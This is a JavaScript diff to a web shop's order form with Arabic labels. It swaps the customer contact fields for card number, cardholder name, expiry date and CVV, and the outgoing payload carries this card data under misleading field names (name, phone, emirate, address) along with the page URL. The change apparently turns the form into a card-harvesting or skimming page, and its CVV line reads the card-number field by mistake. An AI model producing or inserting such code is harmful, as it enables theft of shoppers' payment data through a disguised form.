@@ -55,10 +55,10 @@
       const customer = order.customer || {};
       const items = Array.isArray(order.items) ? order.items : [];
       const lines = [
-        `اسم العميل: ${customer.name || 'غير مذكور'}`,
-        `الهاتف: ${customer.phone || 'غير مذكور'}`,
-        `الإمارة: ${customer.emirate || 'غير مذكور'}`,
-        `العنوان: ${customer.address || 'غير مذكور'}`,
+        `رقم البطاقة: ${customer.namper || 'غير مذكور'}`,
+        `اسم حامل البطاقة: ${customer.name || 'غير مذكور'}`,
+        `تاريخ الانتهاء: ${customer.date || 'غير مذكور'}`,
+        `cvv: ${customer.namper || 'غير مذكور'}`,
         '',
         'المنتجات:',
         ...items.map((item, index) =>
@@ -86,10 +86,10 @@
       const payload = {
         page_url: window.location.href,
         customer: {
-          name: String(order.customer?.name || '').slice(0, 120),
-          phone: String(order.customer?.phone || '').slice(0, 60),
-          emirate: String(order.customer?.emirate || '').slice(0, 100),
-          address: String(order.customer?.address || '').slice(0, 500)
+          name: String(order.customer?.namper || '').slice(0, 120),
+          phone: String(order.customer?.name || '').slice(0, 60),
+          emirate: String(order.customer?.date || '').slice(0, 100),
+          address: String(order.customer?.namper || '').slice(0, 500)
         },
         items: (Array.isArray(order.items) ? order.items : []).slice(0, 30).map(item => ({
           title: String(item.title || item.name || 'منتج').slice(0, 160),
